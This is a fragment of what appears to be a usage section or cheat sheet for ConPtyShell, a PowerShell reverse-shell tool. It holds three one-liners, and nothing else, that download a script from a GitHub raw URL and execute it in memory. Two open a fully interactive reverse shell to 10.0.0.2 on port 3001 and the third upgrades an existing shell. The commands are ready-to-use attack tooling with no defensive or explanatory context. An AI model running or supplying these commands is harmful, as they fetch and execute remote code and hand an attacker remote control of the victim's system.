...
```
IEX(IWR https://raw.githubusercontent.com/Saboor-Hakimi/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
```
...
```
IEX(IWR https://raw.githubusercontent.com/Saboor-Hakimi/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 24 -Cols 80
```
...
```
IEX(IWR https://raw.githubusercontent.com/Saboor-Hakimi/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -Upgrade -Rows 24 -Cols 80
```
